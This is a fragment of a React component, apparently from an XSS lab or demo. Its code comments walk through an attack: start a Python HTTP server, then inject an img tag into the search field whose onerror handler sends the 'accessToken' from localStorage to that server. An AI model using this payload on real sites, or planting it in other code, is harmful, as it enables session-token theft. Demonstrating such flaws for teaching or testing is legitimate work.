  ...
  return (
    <div style={{ maxWidth: '500px', margin: '40px auto', fontFamily: 'Arial, sans-serif' }}>
      <div>
        ...
        {/* exploit to get access token from localStorage:  */}
        {/* Set up python server: python3 -m http.server 8000 */}
        {/* In Search, inject:  <img src="x" onerror="alert(fetch('http://localhost:8000/' + localStorage.getItem('accessToken')))"> */}
